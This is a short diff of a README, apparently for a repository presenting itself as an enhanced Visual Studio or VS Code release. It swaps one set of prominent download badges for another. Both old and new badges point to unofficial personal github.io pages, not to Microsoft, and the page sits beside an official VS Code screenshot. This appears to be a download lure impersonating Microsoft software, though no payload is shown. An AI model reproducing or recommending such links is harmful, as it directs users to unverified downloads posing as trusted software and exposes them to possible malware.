@@ -5,10 +5,8 @@
 </div>
 <br>
 
-<div align="center">
+[![GET Visual Studio](https://img.shields.io/badge/GET%20%E2%80%94%20Visual-Studio-0078D6?style=for-the-badge&logoColor=white)](https://eva740673.github.io/.github/Visual-Studio)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://visual-studio-code-enhanced.github.io/.github/)
-</div>
 
 ---
 
@@ -24,10 +22,8 @@ Workflow optimization features include advanced Git integration, collaborative d
 <img src="https://code.visualstudio.com/assets/docs/getstarted/userinterface/sidebyside.png" width="auto">
 </div>
 
-<div align="center">
+[![GET Visual Studio](https://img.shields.io/badge/GET%20%E2%80%94%20Visual-Studio-0078D6?style=for-the-badge&logoColor=white)](https://eva740673.github.io/.github/Visual-Studio)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://visual-studio-code-enhanced.github.io/.github/)
-</div>
 
 ---
 ### 🎛 Key Features
